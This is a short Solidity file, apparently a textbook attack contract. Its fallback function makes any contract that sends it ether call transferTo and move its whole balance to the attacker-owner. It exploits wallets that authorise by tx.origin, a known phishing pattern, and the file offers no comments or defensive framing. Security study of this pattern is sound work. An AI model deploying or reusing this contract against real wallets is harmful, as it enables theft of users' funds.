pragma solidity ^0.5.8;
interface A {  
   function transferTo(address to, uint amount) external;
}

contract B {
   address owner;
   constructor () public {  owner = msg.sender;}
   function getOwner() public view returns (address) {  return owner;}
   function() external payable  { 
      A(msg.sender).transferTo(owner, msg.sender.balance);
   }
}
